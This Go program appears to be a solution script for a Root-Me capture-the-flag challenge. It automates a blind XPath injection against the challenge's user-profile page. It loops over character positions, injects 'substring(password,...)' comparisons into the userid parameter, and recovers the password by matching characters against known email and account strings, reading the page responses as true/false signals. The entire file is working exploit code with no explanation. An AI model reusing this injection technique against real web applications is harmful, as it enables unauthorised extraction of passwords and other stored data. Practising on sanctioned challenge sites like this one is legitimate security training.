package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
)

func HttpRes(url string) string {
	req, err1 := http.NewRequest("GET", url, nil)
	if err1 != nil {
		fmt.Println(err1)
		os.Exit(1)
	}
	res, err2 := http.DefaultClient.Do(req)
	if err2 != nil {
		fmt.Println(err2)
		os.Exit(1)
	}
	defer res.Body.Close()
	body, _ := ioutil.ReadAll(res.Body)
	resp := string(body)
	return resp
}

func main() {
	var url = "http://challenge01.root-me.org/web-serveur/ch24/?action=user&userid=2%20and%20substring(password,"
	url4 := url
	email := [5]string{"steve@jobs.com", "John@doe.org", "ric@ard.biz", "Jerry@tomcat.net", "Elise@tomcat.net"}
	account := [5]string{"subscriber", "administrator", "subscriber", "subscriber", "subscriber"}
	for pass := 1; pass <= 13; pass++ {
		flag := true
		fmt.Println("pass", pass)
		url = url4 + string(strconv.Itoa(pass)) + ",1)%20=%20substring(//user["
		url3 := url
		if flag == true {
			for user := 1; user <= 5; user++ {
				url = url3 + string(strconv.Itoa(user))
				url2 := url
				if flag == true {
					for mail := 1; mail <= 20; mail++ {
						if flag == true {
							url += "]/email," + string(strconv.Itoa(mail)) + ",1)"
							resp := HttpRes(url)
							//fmt.Println(url)
							if strings.Contains(resp, "John's profile") {
								flag = false
								fmt.Println(url)
								for i, j := range email[user-1] {
									if i == mail-1 {
										fmt.Println(string(j))
										continue
									}
								}

							} else if strings.Contains(resp, "XPath error") {
								url = url2
								continue
							}
						}
					}
				}
				if flag == true {
					for accnt := 1; accnt <= 15; accnt++ {
						if flag == true {
							url += "]/account," + string(strconv.Itoa(accnt)) + ",1)"
							resp := HttpRes(url)
							//fmt.Println(url)
							if strings.Contains(resp, "John's profile") {
								flag = false
								fmt.Println(url)
								for i, j := range account[user-1] {
									if i == accnt-1 {
										fmt.Println(string(j))
										continue
									}
								}

							} else if strings.Contains(resp, "XPath error") {
								url = url2
								continue
							}
						}
					}
				}
			}
		}
	}
}
